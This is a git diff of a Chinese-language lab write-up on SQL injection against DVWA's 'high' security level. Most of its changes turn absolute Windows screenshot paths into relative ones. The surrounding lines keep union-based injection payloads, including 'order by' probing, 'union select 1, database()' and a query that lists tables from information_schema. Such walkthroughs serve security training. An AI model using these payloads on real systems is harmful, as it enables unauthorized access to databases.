@@ -1,6 +1,6 @@
 # 第一步寻找交互页面
 
-![20240914_204328](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_204328.png)
+![20240914_204328](./imgs/20240914_204328.png)
 
 
 
@@ -8,7 +8,7 @@
 
 ## 1、基于报错方式
 
-![局部截取_20240914_205320](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_205320.png)
+![局部截取_20240914_205320](./imgs/20240914_205320.png)
 
 ## 2、基于布尔进行测试
 
@@ -30,13 +30,14 @@
 "
 ```
 
-![局部截取_20240914_205320](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_205320.png)
+![局部截取_20240914_205320](./imgs/20240914_205320.png)
 
-![20240914_213029](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_213029.png)
+![20240914_213029](./imgs/20240914_213029.png)
 
 3、基于联合查询的测试
 
 ```
+
 ```
 
 
@@ -64,9 +65,9 @@ select * from table where id =" " ;
 1' order by 1#
 ```
 
-![20240914_213630](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\20240914_213630.png)
+![20240914_213630](./imgs/20240914_213630.png)
 
-![局部截取_20240914_214216](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214216.png)
+![局部截取_20240914_214216](./imgs/局部截取_20240914_214216.png)
 
 #### 猜测字符类型（确定闭合类型与最大显示位）
 
@@ -84,11 +85,11 @@ select * from table where id =" " ;
 
 
 
-![局部截取_20240914_213955](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_213955.png)
+![局部截取_20240914_213955](./imgs/局部截取_20240914_213955.png)
 
-![局部截取_20240914_214517](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214517.png)
+![局部截取_20240914_214517](./imgs/局部截取_20240914_214517.png)
 
-![局部截取_20240914_214712](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_214712.png)
+![局部截取_20240914_214712](./imgs/局部截取_20240914_214712.png)
 
 
 
@@ -106,7 +107,7 @@ select * from table where id =" " ;
 
 ![image-20240914215412819](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240914215412819.png)
 
-![局部截取_20240914_215806](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_215806.png)
+![局部截取_20240914_215806](./imgs/局部截取_20240914_215806.png)
 
 
 
@@ -120,11 +121,11 @@ select * from table where id =" " ;
 说明1,2 是最大显示位。
 ```
 
-![局部截取_20240914_220006](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220006.png)
+![局部截取_20240914_220006](./imgs/局部截取_20240914_220006.png)
 
 
 
-![局部截取_20240914_220330](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220330.png)
+![局部截取_20240914_220330](./imgs/局部截取_20240914_220330.png)
 
 
 
@@ -137,9 +138,9 @@ select * from table where id =" " ;
 1' union select 1, database() #
 ```
 
-![局部截取_20240914_220946](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_220946.png)
+![局部截取_20240914_220946](./imgs/局部截取_20240914_220946.png)
 
-![局部截取_20240914_221141](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_221141.png)
+![局部截取_20240914_221141](./imgs/局部截取_20240914_221141.png)
 
 
 
@@ -153,7 +154,6 @@ select * from table where id =" " ;
 1' union select (table_name collate utf8_unicode_ci),(table_schema collate utf8_unicode_ci) from information_schema.tables %23
 ```
 
-![局部截取_20240914_222455](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\high\imgs\局部截取_20240914_222455.png)
+![局部截取_20240914_222455](./imgs/局部截取_20240914_222455.png)
 
 # 第六步：获取当前数据库表
-
